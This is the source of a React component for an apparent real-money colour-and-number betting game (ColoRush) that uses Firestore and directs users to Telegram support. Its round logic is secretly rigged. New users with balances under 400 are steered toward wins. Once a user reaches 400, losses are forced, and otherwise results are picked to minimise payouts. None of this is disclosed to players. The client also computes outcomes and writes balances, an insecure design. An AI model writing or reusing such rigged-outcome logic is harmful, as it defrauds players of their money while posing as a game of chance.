
'use client'

import { useState, useEffect, useCallback } from 'react'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardFooter } from '@/components/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { CountdownTimer } from './countdown-timer'
import { PlaceBetDialog } from './place-bet-dialog'
import { useFirebase } from '@/firebase'
import type { Bet, BetColor, BetSize, GameResult, User } from '@/lib/types'
import { collection, doc, writeBatch, serverTimestamp, updateDoc, increment, query, where, getDocs, getDoc, type Firestore, setDoc } from 'firebase/firestore'
import { useToast } from '@/hooks/use-toast'
import { PastResultsTab } from './past-results-tab'
import { MyBetsTab } from './my-bets-tab'
import { errorEmitter } from '@/firebase/error-emitter'
import { FirestorePermissionError } from '@/firebase/errors'

const getWinningSize = (num: number): BetSize => (num >= 5 ? 'big' : 'small')

const getWinningColor = (num: number): BetColor => {
  if (num === 0 || num === 5) return 'white'
  if ([1, 3, 7, 9].includes(num)) return 'green'
  return 'orange'
}

/**
 * Checks if a user's balance has crossed the 400 threshold and updates the flag.
 * This function does not block or await.
 */
const checkAndSetThresholdFlag = (firestore: Firestore, userId: string, newBalance: number) => {
    const userRef = doc(firestore, 'users', userId);
    getDoc(userRef).then(userDoc => {
        if (userDoc.exists()) {
            const userData = userDoc.data() as User;
            if (!userData.hasReached400 && newBalance >= 400) {
                // Use setDoc with merge to avoid overwriting other fields
                setDoc(userRef, { hasReached400: true }, { merge: true }).catch(err => {
                    console.error("Error setting threshold flag: ", err);
                });
            }
        }
    }).catch(err => {
        console.error("Error fetching user doc for threshold check: ", err);
    });
};


const TelegramIcon = (props: React.SVGProps<SVGSVGElement>) => (
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" {...props}>
        <path d="M22 2L11 13" />
        <path d="M22 2L15 22L11 13L2 9L22 2Z" />
    </svg>
);


export function GameArea() {
  const { firestore, user } = useFirebase()
  const { toast } = useToast()

  const [currentRoundId, setCurrentRoundId] = useState<string>('')
  const [isBettingLocked, setIsBettingLocked] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [gameResult, setGameResult] = useState<GameResult | null>(null)
  
  const handleNewRound = useCallback(() => {
    setIsProcessing(false)
    setIsBettingLocked(false)
    setGameResult(null)
    const newRoundId = new Date().getTime().toString();
    setCurrentRoundId(newRoundId)
  }, [])
  
  useEffect(() => {
    handleNewRound()
  }, [handleNewRound])

  const handleRoundEnd = useCallback(async () => {
    if (!firestore || !currentRoundId || !user) return;

    setIsBettingLocked(true);
    setIsProcessing(true);

    // Get current user's data to apply dynamic winning logic
    let currentUserData: User | null = null;
    try {
        const userDocRef = doc(firestore, 'users', user.uid);
        const userDoc = await getDoc(userDocRef);
        if (userDoc.exists()) {
            currentUserData = userDoc.data() as User;
        }
    } catch(e) {
        console.error("Could not fetch user data for round logic: ", e);
    }
    
    // Determine winning chance based on balance and history
    const WINNING_CHANCE_HIGH = 0.8; // 80% for users with balance < 400 and flag is false
    const WINNING_CHANCE_LOW = 0.3; // 30% for regular users
    
    let userWinningChance = WINNING_CHANCE_LOW; // Default
    if (currentUserData) {
        if (!currentUserData.hasReached400 && currentUserData.balance < 400) {
            userWinningChance = WINNING_CHANCE_HIGH;
        } else if (currentUserData.hasReached400) {
            userWinningChance = 0; // User will be forced to lose
        }
    }

    const betsQuery = query(
        collection(firestore, 'bets'), 
        where('roundId', '==', currentRoundId),
        where('status', '==', 'pending')
    );

    let betsToProcess: Bet[] = [];
    try {
        const pendingBetsSnapshot = await getDocs(betsQuery);
        betsToProcess = pendingBetsSnapshot.docs.map(doc => ({...doc.data(), id: doc.id} as Bet));
    } catch (error) {
        console.error("Error fetching pending bets: ", error);
        toast({ variant: "destructive", title: "Round Error", description: "Could not fetch bets to process round." });
        
        if (error instanceof Error && (error as any).code === 'permission-denied') {
             const contextualError = new FirestorePermissionError({
                path: `bets`,
                operation: 'list',
                requestResourceData: { info: "Querying for pending bets in a round failed." },
            });
            errorEmitter.emit('permission-error', contextualError);
        }
        setIsProcessing(false);
        return;
    }
    

    const potentialPayouts: { [num: number]: number } = {};
    for (let i = 0; i <= 9; i++) {
        potentialPayouts[i] = 0;
    }
    
    betsToProcess.forEach(bet => {
        if (bet.type === 'number' && typeof bet.target === 'number') {
            potentialPayouts[bet.target] += bet.amount * 9;
        }
        for (let i = 0; i <= 9; i++) {
            const winningColor = getWinningColor(i);
            const winningSize = getWinningSize(i);
            let payoutMultiplier = 2;

            if (bet.type === 'color' && bet.target === winningColor) {
                potentialPayouts[i] += bet.amount * payoutMultiplier;
            }
            if (bet.type === 'size' && bet.target === winningSize) {
                potentialPayouts[i] += bet.amount * 2;
            }
        }
    });

    let winningNumber: number;
    const userHasBet = betsToProcess.some(bet => bet.userId === user.uid);

    if (currentUserData?.hasReached400 && userHasBet) {
        // Force a loss for the user
        const userBets = betsToProcess.filter(bet => bet.userId === user.uid);
        const losingNumbersForUser: number[] = [];
        for (let i = 0; i <= 9; i++) {
            const isWin = userBets.some(bet => 
                (bet.type === 'number' && bet.target === i) ||
                (bet.type === 'color' && bet.target === getWinningColor(i)) ||
                (bet.type === 'size' && bet.target === getWinningSize(i))
            );
            if (!isWin) {
                losingNumbersForUser.push(i);
            }
        }

        if (losingNumbersForUser.length > 0) {
            winningNumber = losingNumbersForUser[Math.floor(Math.random() * losingNumbersForUser.length)];
        } else {
            // User bet on everything, must win something, pick lowest payout
            let minPayout = Infinity;
            let bestNumber = -1;
            for (let i = 0; i <= 9; i++) {
                if (potentialPayouts[i] < minPayout) {
                    minPayout = potentialPayouts[i];
                    bestNumber = i;
                }
            }
            winningNumber = bestNumber;
        }

    } else if (userHasBet && Math.random() < userWinningChance) {
        // User is lucky, try to make them win
        const userBets = betsToProcess.filter(bet => bet.userId === user.uid);
        const possibleWinningNumbersForUser: number[] = [];
        for (let i = 0; i <= 9; i++) {
            const isWin = userBets.some(bet => 
                (bet.type === 'number' && bet.target === i) ||
                (bet.type === 'color' && bet.target === getWinningColor(i)) ||
                (bet.type === 'size' && bet.target === getWinningSize(i))
            );
            if (isWin) {
                possibleWinningNumbersForUser.push(i);
            }
        }

        if (possibleWinningNumbersForUser.length > 0) {
            let minPayout = Infinity;
            let bestNumber = -1;
            possibleWinningNumbersForUser.forEach(num => {
                if (potentialPayouts[num] < minPayout) {
                    minPayout = potentialPayouts[num];
                    bestNumber = num;
                }
            });
            winningNumber = bestNumber;
        } else {
            winningNumber = Math.floor(Math.random() * 10);
        }

    } else {
        // House is lucky, or user didn't bet. Minimize payout for everyone.
        let minPayout = Infinity;
        let bestNumbers: number[] = [];

        for (let i = 0; i <= 9; i++) {
            if (potentialPayouts[i] < minPayout) {
                minPayout = potentialPayouts[i];
                bestNumbers = [i];
            } else if (potentialPayouts[i] === minPayout) {
                bestNumbers.push(i);
            }
        }
        winningNumber = bestNumbers.length > 0 ? bestNumbers[Math.floor(Math.random() * bestNumbers.length)] : Math.floor(Math.random() * 10);
    }


    const winningColor = getWinningColor(winningNumber);
    const winningSize = getWinningSize(winningNumber);

    const resultData: GameResult = {
        id: currentRoundId,
        roundId: currentRoundId,
        winningNumber,
        winningColor,
        winningSize,
        endedAt: new Date(),
    };
    
    setGameResult(resultData);

    try {
        const batch = writeBatch(firestore);
        const roundDocRef = doc(firestore, 'game_rounds', currentRoundId);
        batch.set(roundDocRef, {
            ...resultData,
            endedAt: serverTimestamp()
        });
  
        const userPayouts: { [userId: string]: { balance: number, winningsBalance: number } } = {};
        const userDocs: { [userId: string]: User } = {}; // Cache user docs

        for (const bet of betsToProcess) {
            const betDocRef = doc(firestore, 'bets', bet.id);
            let hasWon = false;
            let payout = 0;
    
            if (bet.type === 'number' && bet.target === resultData.winningNumber) {
                hasWon = true;
                payout = bet.amount * 9;
            } else if (bet.type === 'color' && bet.target === resultData.winningColor) {
                hasWon = true;
                payout = bet.amount * 2;
            } else if (bet.type === 'size' && bet.target === resultData.winningSize) {
                hasWon = true;
                payout = bet.amount * 2;
            }
    
            batch.update(betDocRef, {
                status: hasWon ? 'win' : 'loss',
                payout,
            });
    
            if (hasWon) {
                if (!userPayouts[bet.userId]) {
                    userPayouts[bet.userId] = { balance: 0, winningsBalance: 0 };
                }
                userPayouts[bet.userId].balance += payout;
                userPayouts[bet.userId].winningsBalance += payout;
            }
        }

        for (const userId in userPayouts) {
            const payout = userPayouts[userId];
            if (payout.balance > 0) {
                const userRef = doc(firestore, "users", userId);
                batch.update(userRef, { 
                    balance: increment(payout.balance),
                    winningsBalance: increment(payout.winningsBalance) 
                });
                // Check for threshold crossing after win
                const userDoc = await getDoc(userRef);
                if (userDoc.exists()) {
                    const currentBalance = userDoc.data().balance;
                    checkAndSetThresholdFlag(firestore, userId, currentBalance + payout.balance);
                }
            }
        }
        
        await batch.commit();

    } catch (error) {
      console.error("Error saving round results to DB: ", error);
      toast({ variant: "destructive", title: "Save Error", description: "Could not save round results." });
      
       if (error instanceof Error && (error as any).code === 'permission-denied') {
            const contextualError = new FirestorePermissionError({
                path: `bets or game_rounds`,
                operation: 'write',
                requestResourceData: { info: "Batch write for round end processing failed." },
            });
            errorEmitter.emit('permission-error', contextualError);
        }
    } finally {
        setIsProcessing(false);
    }
  }, [firestore, currentRoundId, toast, user]);

  const renderResult = () => {
    if (!gameResult) {
        if (isProcessing) {
             return <div className="flex flex-col items-center justify-center space-y-4 p-8 rounded-lg bg-card-foreground/5"><p>Calculating result...</p></div>
        }
        return null;
    }

    return (
      <div className="animate-in fade-in-50 flex flex-col items-center justify-center space-y-4 p-8 rounded-lg bg-card-foreground/5">
        <h3 className="text-2xl font-bold">Round {gameResult.roundId.substring(9, 13)} Result</h3>
        <div className="flex items-center space-x-4">
          <div className="flex flex-col items-center">
            <span className="text-sm text-muted-foreground">Number</span>
            <span className={`text-5xl font-bold text-${gameResult.winningColor}-500`}>{gameResult.winningNumber}</span>
          </div>
          <div className="flex flex-col items-center">
            <span className="text-sm text-muted-foreground">Color</span>
            <span className={`text-3xl font-bold capitalize text-${gameResult.winningColor}-500`}>{gameResult.winningColor}</span>
          </div>
           <div className="flex flex-col items-center">
            <span className="text-sm text-muted-foreground">Size</span>
            <span className="text-3xl font-bold capitalize">{gameResult.winningSize}</span>
          </div>
        </div>
      </div>
    )
  }

  return (
    <Card>
      <CardContent className="p-4">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
          <div className="flex flex-col items-center justify-center">
            <p className="text-sm text-muted-foreground">Round ID</p>
            <p className="text-lg font-semibold">{currentRoundId.substring(9, 13)}</p>
          </div>
          <CountdownTimer 
            key={currentRoundId} 
            roundId={currentRoundId}
            onRoundEnd={handleRoundEnd}
            onNewRound={handleNewRound}
          />
          <div className="flex items-center justify-center">
             <Button variant="outline" onClick={() => window.location.reload()}>Refresh Game</Button>
          </div>
        </div>

        {isBettingLocked || gameResult ? (
            renderResult()
        ) : (
          <div className="space-y-4 animate-in fade-in-20">
            <div className="grid grid-cols-3 gap-2">
              <PlaceBetDialog type="color" target="green" roundId={currentRoundId} disabled={isBettingLocked} />
              <PlaceBetDialog type="color" target="white" roundId={currentRoundId} disabled={isBettingLocked} />
              <PlaceBetDialog type="color" target="orange" roundId={currentRoundId} disabled={isBettingLocked} />
            </div>
            <div className="grid grid-cols-5 gap-2">
              {[0, 1, 2, 3, 4, 5, 6, 7, 8, 9].map(num => (
                <PlaceBetDialog key={num} type="number" target={num} roundId={currentRoundId} disabled={isBettingLocked} />
              ))}
            </div>
            <div className="grid grid-cols-2 gap-2">
                <PlaceBetDialog type="size" target="small" roundId={currentRoundId} disabled={isBettingLocked} />
                <PlaceBetDialog type="size" target="big" roundId={currentRoundId} disabled={isBettingLocked} />
            </div>
          </div>
        )}

        <Tabs defaultValue="myBets" className="mt-6">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="pastResults">Past Results</TabsTrigger>
            <TabsTrigger value="myBets">My Bet History</TabsTrigger>
          </TabsList>
          <TabsContent value="pastResults">
            <PastResultsTab />
          </TabsContent>
          <TabsContent value="myBets">
            {user ? <MyBetsTab userId={user.uid} key={currentRoundId} /> : <p className="text-center py-4">Please log in to see your bets.</p>}
          </TabsContent>
        </Tabs>
      </CardContent>
      <CardFooter className="flex-col items-center justify-center pt-4 border-t">
        <p className="text-sm text-muted-foreground">
          Kisi bhi samasya ke liye, aap humse Telegram par sampark kar sakte hain.
        </p>
        <Button variant="link" asChild className="mt-1">
          <a href="https://t.me/ColoRushSupport" target="_blank" rel="noopener noreferrer">
            <TelegramIcon className="mr-2 h-4 w-4" />
            @ColoRushSupport
          </a>
        </Button>
      </CardFooter>
    </Card>
  )
}
